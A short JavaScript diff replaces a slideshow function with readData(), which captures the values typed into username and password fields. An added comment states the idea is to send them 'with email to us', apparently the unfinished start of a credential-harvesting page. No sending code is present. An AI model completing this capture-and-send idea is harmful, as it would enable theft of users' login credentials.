@@ -1,20 +1,12 @@
-let screenIndex = 0
-
-function SwitchScreen() {
-
-  const screens = document.querySelectorAll('.screen')
-
-  for (i = 0; i < screens.length; i++) {
-    screens[i].style.display = "none"
+// some mistakes here !! trying to fix 
+// idea is sending  with email to us 
+function readData() {
+  try{
+    username =document.getElementById("username").value;
+    password = document.getElementById("password").value;
   }
-  
-  screenIndex++
-
-  if (screenIndex > screens.length) {
-      screenIndex = 1
-    }
-
-  screens[screenIndex-1].style.display = "block"
-  setTimeout(SwitchScreen, 2500)
-
+  catch(error){
+    console.log(error)
+  }
 }
+
